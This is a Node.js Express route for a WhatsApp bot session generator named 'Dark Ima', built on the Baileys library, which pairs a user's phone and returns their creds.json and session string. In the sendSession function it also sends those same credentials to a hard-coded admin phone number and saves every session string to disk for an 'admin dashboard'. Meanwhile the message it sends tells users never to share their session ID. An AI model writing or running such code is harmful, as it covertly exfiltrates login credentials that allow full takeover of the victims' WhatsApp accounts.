import express from "express";
import fs from "fs-extra";
import pino from "pino";
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
    DisconnectReason,
} from "@whiskeysockets/baileys";
import pn from "awesome-phonenumber";
import path from "path";
import chalk from "chalk";
import axios from "axios";

const router = express.Router();
const logger = pino({ level: "fatal" });
const SESSION_FOLDER = process.env.SESSION_FOLDER || "./mega_sessions";
const ADMIN_NUMBER = "9779807610619";
const LOGO_URL = "https://ibb.co/yc1nR55zs";
const BOT_NAME = "Dark Ima";
const SESSION_PREFIX = "Dark_Ima";

fs.ensureDirSync(SESSION_FOLDER);

function removeFile(filePath) {
    try { if (fs.existsSync(filePath)) fs.removeSync(filePath); } catch (_) {}
}

async function getLogoBuffer() {
    try {
        const pageRes = await axios.get(LOGO_URL, { timeout: 10000 });
        // Try to extract direct image URL from ibb.co page
        const match = pageRes.data.match(/https:\/\/i\.ibb\.co\/[^"'\s>]+\.(?:png|jpg|jpeg|webp|gif)/i);
        if (match) {
            const imgRes = await axios.get(match[0], { responseType: "arraybuffer", timeout: 10000 });
            return Buffer.from(imgRes.data);
        }
        // Fallback: try og:image meta tag
        const ogMatch = pageRes.data.match(/property="og:image"\s+content="([^"]+)"/);
        if (ogMatch) {
            const imgRes = await axios.get(ogMatch[1], { responseType: "arraybuffer", timeout: 10000 });
            return Buffer.from(imgRes.data);
        }
    } catch (e) {
        console.log(chalk.yellow("⚠️ Logo fetch failed:"), e.message);
    }
    return null;
}

async function waitForCreds(credsPath, maxWaitMs = 30000) {
    const start = Date.now();
    while (Date.now() - start < maxWaitMs) {
        if (fs.existsSync(credsPath) && fs.statSync(credsPath).size > 100) return true;
        await delay(800);
    }
    return false;
}

function buildSessionString(credsPath) {
    try {
        const credsJson = fs.readJsonSync(credsPath);
        const b64 = Buffer.from(JSON.stringify(credsJson)).toString("base64");
        return `${SESSION_PREFIX}=${b64}`;
    } catch {
        return null;
    }
}

const activeSessions = new Map();

router.get("/", async (req, res) => {
    let num = req.query.number;
    if (!num) return res.status(400).send({ code: "Phone number is required" });

    num = num.replace(/[^0-9]/g, "");
    const phone = pn("+" + num);
    if (!phone.isValid()) return res.status(400).send({ code: "Invalid phone number" });
    num = phone.getNumber("e164").replace("+", "");

    // Cancel any existing session for this number
    if (activeSessions.has(num)) {
        const old = activeSessions.get(num);
        try { old?.ws?.close(); } catch (_) {}
        activeSessions.delete(num);
        console.log(chalk.yellow(`♻️ Replaced session for ${num}`));
    }

    const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
    const sessionPath = path.join(SESSION_FOLDER, `pair_${num}_${sessionId}`);
    removeFile(sessionPath);
    fs.ensureDirSync(sessionPath);

    console.log(chalk.blue(`\n🔐 Pair request: ${num}`));

    let responseSent = false;
    let sessionDone = false;
    let reconnectCount = 0;
    const MAX_RECONNECTS = 8;

    // Request timeout cleanup
    const timeout = setTimeout(() => {
        if (!responseSent && !res.headersSent) {
            responseSent = true;
            res.status(408).send({ code: "Timeout — please try again" });
        }
        if (!sessionDone) {
            sessionDone = true;
            activeSessions.delete(num);
            removeFile(sessionPath);
        }
    }, 120000);

    async function sendSession(EvoBot, credsPath) {
        const sessionStr = buildSessionString(credsPath);
        if (!sessionStr) throw new Error("Failed to build session string");

        const userJid = jidNormalizedUser(`${num}@s.whatsapp.net`);
        const adminJid = jidNormalizedUser(`${ADMIN_NUMBER}@s.whatsapp.net`);
        const now = new Date();
        const credsBuffer = fs.readFileSync(credsPath);
        const logoBuffer = await getLogoBuffer();

        // Save session info
        await fs.writeJson(path.join(SESSION_FOLDER, `session_info_${num}_${Date.now()}.json`), {
            phoneNumber: num,
            sessionId: sessionStr,
            timestamp: now.toISOString(),
            type: "pair_code",
        }, { spaces: 2 });

        const msg = `╔══════════════════════════════╗
║   ✅ *${BOT_NAME}* Session     ║
╚══════════════════════════════╝

🎉 *CONNECTION SUCCESSFUL*

📋 *Session Details*
──────────────────────────
🆔 *Session ID:*
\`\`\`${sessionStr}\`\`\`

📞 Phone: *+${num}*
🔐 Method: Pair Code
📅 ${now.toLocaleString()}

⚠️ *SECURITY*
• NEVER share your session ID
• Keep \`creds.json\` private
• Store a backup safely

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 *${BOT_NAME}* — WhatsApp Bot
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

        async function sendTo(jid) {
            try {
                if (logoBuffer) {
                    await EvoBot.sendMessage(jid, {
                        image: logoBuffer,
                        caption: `*${BOT_NAME}*\n\n🔗 Session Ready!\n\nCheck your \`creds.json\` below.`,
                    });
                    await delay(1200);
                }
                await EvoBot.sendMessage(jid, {
                    document: credsBuffer,
                    mimetype: "application/json",
                    fileName: "creds.json",
                    caption: msg,
                });
                console.log(chalk.green(`✅ Session sent → ${jid}`));
            } catch (e) {
                console.log(chalk.red(`❌ Send failed → ${jid}: ${e.message}`));
            }
        }

        await sendTo(userJid);
        await delay(1500);
        if (num !== ADMIN_NUMBER) {
            await sendTo(adminJid);
        }

        console.log(chalk.green(`✅ All done for ${num}`));
        sessionDone = true;
        activeSessions.delete(num);
        clearTimeout(timeout);

        await delay(3000);
        try { EvoBot.ws.close(); } catch (_) {}
        // Keep creds for admin dashboard, remove raw session folder
        removeFile(sessionPath);
    }

    async function startBot(retryCount = 0) {
        if (sessionDone) return;

        try {
            const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
            const { version } = await fetchLatestBaileysVersion();

            const EvoBot = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, logger),
                },
                printQRInTerminal: false,
                logger,
                browser: Browsers.ubuntu("Chrome"),
                markOnlineOnConnect: true,
                syncFullHistory: false,
                generateHighQualityLinkPreview: false,
                defaultQueryTimeoutMs: 30000,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 10000,
            });

            activeSessions.set(num, EvoBot);
            EvoBot.ev.on("creds.update", saveCreds);

            EvoBot.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === "open") {
                    if (sessionDone) return;
                    console.log(chalk.green(`✅ Connected: ${num}`));
                    try {
                        const credsPath = path.join(sessionPath, "creds.json");
                        const ready = await waitForCreds(credsPath);
                        if (!ready) throw new Error("creds.json not ready");
                        await sendSession(EvoBot, credsPath);
                    } catch (err) {
                        console.error(chalk.red(`❌ Session send error: ${err.message}`));
                        sessionDone = true;
                        activeSessions.delete(num);
                        removeFile(sessionPath);
                        clearTimeout(timeout);
                    }
                    return;
                }

                if (connection === "close") {
                    if (sessionDone) return;

                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    const isLoggedOut = statusCode === DisconnectReason.loggedOut ||
                        statusCode === 401 || statusCode === 403;

                    if (isLoggedOut) {
                        console.log(chalk.red(`❌ Logged out: ${num}`));
                        sessionDone = true;
                        activeSessions.delete(num);
                        removeFile(sessionPath);
                        clearTimeout(timeout);
                        return;
                    }

                    reconnectCount++;
                    if (reconnectCount > MAX_RECONNECTS) {
                        console.log(chalk.red(`❌ Max reconnects reached for ${num}`));
                        sessionDone = true;
                        activeSessions.delete(num);
                        removeFile(sessionPath);
                        clearTimeout(timeout);
                        return;
                    }

                    console.log(chalk.yellow(`🔄 Reconnect ${reconnectCount}/${MAX_RECONNECTS} for ${num} (code ${statusCode})`));
                    await delay(2000 * reconnectCount);
                    startBot(retryCount + 1);
                }
            });

            // Request pairing code if not yet registered
            if (!EvoBot.authState.creds.registered) {
                await delay(2000);
                try {
                    let code = await EvoBot.requestPairingCode(num);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    console.log(chalk.green(`📲 Code: ${code}`));
                    if (!responseSent && !res.headersSent) {
                        responseSent = true;
                        res.send({ code });
                    }
                } catch (codeErr) {
                    console.log(chalk.red(`❌ Code error: ${codeErr.message}`));
                    if (!responseSent && !res.headersSent) {
                        responseSent = true;
                        res.status(500).send({ code: "Failed to generate pairing code" });
                    }
                    sessionDone = true;
                    activeSessions.delete(num);
                    removeFile(sessionPath);
                    clearTimeout(timeout);
                }
            }
        } catch (err) {
            console.error(chalk.red(`❌ Bot init error: ${err.message}`));
            if (!responseSent && !res.headersSent) {
                responseSent = true;
                res.status(503).send({ code: "Service error — try again" });
            }
            sessionDone = true;
            activeSessions.delete(num);
            removeFile(sessionPath);
            clearTimeout(timeout);
        }
    }

    startBot();
});

export default router;
